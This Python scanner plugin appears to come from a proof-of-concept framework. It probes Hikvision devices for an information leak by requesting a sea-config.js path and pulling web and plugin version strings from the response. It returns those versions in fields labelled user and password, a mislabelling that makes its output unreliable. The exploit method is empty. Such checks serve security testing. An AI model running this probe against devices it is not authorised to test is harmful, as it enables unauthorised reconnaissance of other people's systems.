import re
import requests

from loguru import logger

from .base import POCTemplate


class HikvisionInformationLeakage(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['hikvision']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/doc/script/lib/seajs/config/sea-config.js?version="
        try:
            r = requests.get(url, headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and ('seajs.web_version' in r.text) and ('seajs.plugin_version' in r.text):
                web_ver = re.search(r"(\w+\.\w+\.\d+\w+\d+)", r.text)
                plugin_ver = re.search(r"(\w+\.\d+\.\d+\.\d+)", r.text)
                user = web_ver.group(1) if web_ver else ''
                password = plugin_ver.group(1) if plugin_ver else ''
                return ip, str(port), self.product, user, password, self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(HikvisionInformationLeakage)
